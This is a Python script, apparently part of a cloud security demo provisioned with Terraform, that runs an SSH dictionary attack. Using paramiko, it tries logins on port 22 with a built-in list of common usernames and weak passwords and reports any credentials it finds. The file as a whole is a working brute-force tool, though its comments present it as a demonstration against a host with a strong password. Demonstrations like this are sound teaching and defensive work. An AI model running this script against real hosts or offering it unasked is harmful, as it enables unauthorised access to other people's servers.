#!/usr/bin/env python3
"""SSH dictionary attack demo for the Attack & Defense security demo.

Injected into the attacker ECS via cloud-init with HOST_IP pre-loaded.
Can also be run manually with --host-ip.

Usage:
    python3 /opt/ssh_bruteforce.py
    python3 /opt/ssh_bruteforce.py --host-ip 1.2.3.4
"""
import argparse
import socket
import sys
import time

import paramiko

# Replaced by Terraform at provisioning time; argparse fallback if still placeholder.
HOST_IP = "__HOST_IP__"

USERS = ["root", "admin", "ubuntu", "user"]
PASSWORDS = [
    "admin", "password", "123456", "huawei", "toor",
    "root", "admin123", "passw0rd", "P@ssw0rd", "12345678",
]
PORT = 22
TIMEOUT = 5
DELAY = 0.5  # seconds between attempts — keeps the demo readable


def try_ssh(host: str, port: int, user: str, password: str) -> bool:
    """Attempt a single SSH login. Returns True on success."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port,
            username=user,
            password=password,
            timeout=TIMEOUT,
            allow_agent=False,
            look_for_keys=False,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.timeout, socket.error, paramiko.SSHException) as exc:
        print(f"  [!] connection error: {exc}")
        return False
    finally:
        client.close()


def main() -> None:
    host = HOST_IP
    if not host[:1].isdigit():  # placeholder not replaced → require --host-ip
        parser = argparse.ArgumentParser(description="SSH brute-force demo")
        parser.add_argument("--host-ip", required=True, help="target host public IP")
        args = parser.parse_args()
        host = args.host_ip

    print("=== SSH brute-force demo ===")
    print(f"Target: {host}:{PORT}")
    print(f"Users: {USERS}")
    print(f"Passwords: {len(PASSWORDS)} candidates")
    print()

    attempts = 0
    for user in USERS:
        for password in PASSWORDS:
            attempts += 1
            ok = try_ssh(host, PORT, user, password)
            status = "SUCCESS" if ok else "fail"
            print(f"[{attempts:3d}] {user}:{password:<12} -> {status}")
            if ok:
                print(f"\n[+] Credentials found: {user}:{password}")
                print("[+] In a real attack, the session would be hijacked.")
                return
            time.sleep(DELAY)

    print(f"\n[-] All {attempts} attempts failed (expected — host password is strong, not in the dictionary).")


if __name__ == "__main__":
    main()
